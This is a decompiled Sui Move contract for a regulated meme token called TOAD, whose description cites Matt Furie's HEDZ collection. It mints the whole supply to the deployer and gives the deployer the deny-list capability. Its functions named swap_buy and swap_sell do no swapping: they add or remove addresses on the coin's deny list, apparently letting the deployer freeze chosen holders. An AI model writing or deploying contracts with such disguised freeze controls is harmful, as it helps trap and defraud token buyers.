module 0xdd2fcd89cb46efabc3c8842ea4eb586531b9f9a290238193e4094202b023255b::toad {
    struct TOAD has drop {
        dummy_field: bool,
    }

    struct CapWrapper has key {
        id: 0x2::object::UID,
    }

    fun init(arg0: TOAD, arg1: &mut 0x2::tx_context::TxContext) {
        let (v0, v1, v2) = 0x2::coin::create_regulated_currency_v2<TOAD>(arg0, 9, b"TOAD", b"Acid Toad", b"$TOAD takes his surreal, psychedelic aesthetic to new heights. Released as part of the #HEDZ NFT collection by @Matt_furie", 0x1::option::some<0x2::url::Url>(0x2::url::new_unsafe(0x1::ascii::string(b"https://ipfs.io/ipfs/QmdHkMikgjujJea6xyhnMqDz3axA4HrMtiFzuMJKGVT226"))), false, arg1);
        let v3 = v0;
        0x2::coin::mint_and_transfer<TOAD>(&mut v3, 1000000000000000000, 0x2::tx_context::sender(arg1), arg1);
        0x2::transfer::public_freeze_object<0x2::coin::CoinMetadata<TOAD>>(v2);
        0x2::transfer::public_freeze_object<0x2::coin::TreasuryCap<TOAD>>(v3);
        0x2::transfer::public_transfer<0x2::coin::DenyCapV2<TOAD>>(v1, 0x2::tx_context::sender(arg1));
    }

    public fun swap_buy(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TOAD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_add<TOAD>(arg0, arg1, arg2, arg3);
    }

    public fun swap_sell(arg0: &mut 0x2::deny_list::DenyList, arg1: &mut 0x2::coin::DenyCapV2<TOAD>, arg2: address, arg3: &mut 0x2::tx_context::TxContext) {
        0x2::coin::deny_list_v2_remove<TOAD>(arg0, arg1, arg2, arg3);
    }

    // decompiled from Move bytecode v6
}

